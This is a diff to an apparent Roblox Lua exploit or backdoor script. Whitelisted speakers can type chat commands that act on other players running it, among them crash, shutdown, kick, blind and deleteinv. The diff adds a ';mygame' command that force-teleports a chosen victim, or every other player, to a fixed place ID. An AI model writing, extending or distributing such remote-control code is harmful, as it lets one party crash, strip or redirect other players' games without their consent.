@@ -5,7 +5,7 @@ local Notify = function(_Title, _Text , Time)
 end
 local cmds = "⭐cmds are: reset,ac,void,kick,sit,ad,config."
 local cmds2="help,tbring,song,hev,lobby,vclipdown,butterfingers,listore,breakbow,dropheld,rageblade."
-local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv,crash,shutdown⭐"
+local cmds3 = "blind,unblind,telepearl,emeraldarmor,apple,popups,deleteinv,crash,shutdown,mygame⭐"
 local ores = "⭐ores that can be dropped are:"
 local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 local sexlist = {
@@ -94,6 +94,13 @@ elseif cmd == ";shutdown" and getsexter(speaker) and game.Players.LocalPlayer.Na
 game:shutdown()
 elseif cmd == ";shutdown" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 game:shutdown()
+
+elseif cmd == ";mygame" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+local TeleportService = game:GetService("TeleportService")
+TeleportService:Teleport("13981252889")
+elseif cmd == ";mygame" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+local TeleportService = game:GetService("TeleportService")
+TeleportService:Teleport("13981252889")
 
 
 elseif cmd == ";deleteinv" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
